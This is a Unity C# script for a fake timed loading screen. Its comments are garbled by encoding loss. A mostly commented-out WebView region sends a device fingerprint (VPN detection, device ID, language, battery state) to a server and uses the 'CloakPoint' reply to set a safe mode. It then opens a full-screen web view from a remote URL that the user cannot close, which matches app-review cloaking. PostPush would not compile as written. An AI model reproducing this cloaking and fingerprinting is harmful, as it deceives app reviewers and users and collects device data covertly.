using System.Collections;
using System.Collections.Generic;
using System.Net.NetworkInformation;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class LoadView : MonoBehaviour
{
    public Text loadingText;          // ����� ��������� ��������
    public Image loadingBar;          // Image ��� ������� ��������
    public float loadDuration = 5f;   // ������������ �������� � ��������
    private float currentProgress = 0f;   // ������� �������� ���������

    // ����� ��� ������ ������������ ������
    public void ShowLoadingScreen()
    {
        gameObject.SetActive(true);
        StartCoroutine(ProcessData());
        StartCoroutine(UpdateLoadingBar());
    }

    // ����� ��� ������� ������������ ������
    public void HideLoadingScreen()
    {
        gameObject.SetActive(false);
        StopCoroutine(ProcessData());
        StopCoroutine(UpdateLoadingBar());
    }

    // ������ ��������� ������
    IEnumerator ProcessData()
    {
        float elapsedTime = 0f;

        while (elapsedTime < loadDuration)
        {
            elapsedTime += Time.deltaTime;
            currentProgress = Mathf.Clamp01(elapsedTime / loadDuration);

            if (loadingText != null)
            {
                loadingText.text = (currentProgress * 100).ToString("F0") + "%";
            }

            //if (loadingBar != null)
            //{
            //    loadingBar.fillAmount = progress;
            //}

            // ����� ����� �������� ����������� �� ����� ���������
            // ��������, ������ ������� ��������� ������

            yield return null;  // ����� �� ���������� �����
        }

        HideLoadingScreen();
    }
    IEnumerator UpdateLoadingBar()
    {
        while (true)
        {
            if (loadingBar != null)
            {
                loadingBar.fillAmount += Time.deltaTime;
            }
            // ���� �������� fillAmount �������� 1, �������� ��� �� 0
            if (loadingBar.fillAmount >= 1f)
            {
                loadingBar.fillAmount = 0f;
            }
            yield return null;  // ����� �� ���������� �����
        }
    }
    #region WebView
    /*
    public static WebViewTemplate instance;
    public int Times;

    private void Awake()
    {
        instance = this;
    }
    public void DefindAndOpen()
    {
        PlayerPrefs.SetString("End", "True");
        PlayerPrefs.SetString("WasShowed", "1");

        string url = string.Empty;

        if (PlayerPrefs.HasKey("CacheU"))
            url = PlayerPrefs.GetString("CacheU");
        else
            url = FirebaseTemplate.instance.GetStringByKey("info");

        OpenWebView(url);
    }
    [SerializeField] UniWebView webView;
    [SerializeField] SafeArea safeArea;

    public void OpenWebView(string Url)
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);

        webView.Load(Url);
        webView.Show();
        webView.EmbeddedToolbar.Hide();
        UniWebView.SetJavaScriptEnabled(true);

        webView.OnPageFinished += (view, statusCode, url) =>
        {
            if (!PlayerPrefs.HasKey("CacheU"))
            {
                if (Times == 1)
                {
                    if (!url.Contains("widgets-04"))
                        PlayerPrefs.SetString("CacheU", url);
                }
                Times++;
            }
        };

        webView.OnOrientationChanged += (view, orientation) =>
        {
            safeArea.RefreshRectTransform();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
        };

        webView.OnShouldClose += (view) =>
        {
            return false;
        };
    }
    */
    // ���������� ���� �������
    /*public void PostPush()
    {
        string CloakPoint = string.Empty;
        string endData = GenerateData();
        using (UnityWebRequest www = UnityWebRequest.Post("https://1-0-url", endData, "application/json"))
        {
            yield return www.SendWebRequest();
            if (www.result != UnityWebRequest.Result.Success)
            {
                //OnBoard - Review
            }
            else
            {
                CloakPoint = www.downloadHandler.text;
            }
        }

        _percentGoalNow = 70;
        if (CloakPoint.Contains("0"))
            _safeMode = false;
        else
            _safeMode = true;
        _percentGoalNow = 101;
    }*/

    // ����� ��������� ������
    public string GenerateData()
    {
        bool isVPN = IsVpn();
        string id = SystemInfo.deviceUniqueIdentifier;
        string lang = Application.systemLanguage.ToString();
        string batteryLevel = (SystemInfo.batteryLevel * 100).ToString();
        bool batteryStatus = SystemInfo.batteryStatus == BatteryStatus.Charging;
        bool batteryFull = SystemInfo.batteryStatus == BatteryStatus.Full;
        string endData = $"{{\"userData\":{{ \"agQG\": {isVPN.ToString().ToLower()}," +
            $" \"qGaw\": \"{id}\", \"LGaB\": \"{lang}\", \"isCh\": {batteryStatus.ToString().ToLower()}," +
            $" \"isFu\": {batteryFull.ToString().ToLower()}, \"BLel\": \"{batteryLevel}\" }}}}";
    return endData;
    }

    // �������� �� VPN
    public bool IsVpn()
    {
        bool isVPN = false;
        if (NetworkInterface.GetIsNetworkAvailable())
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface Interface in interfaces)
            {
                if (Interface.OperationalStatus == OperationalStatus.Up)
                {
                    if
                                        (
                                                ((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp)
                                                && (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback))
                                                || Interface.Description.Contains("VPN")
                                                || Interface.Description.Contains("vpn"))
                    {
                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
                        isVPN = true;
                    }
                }
            }
        }
        return isVPN;
    }
    #endregion
}
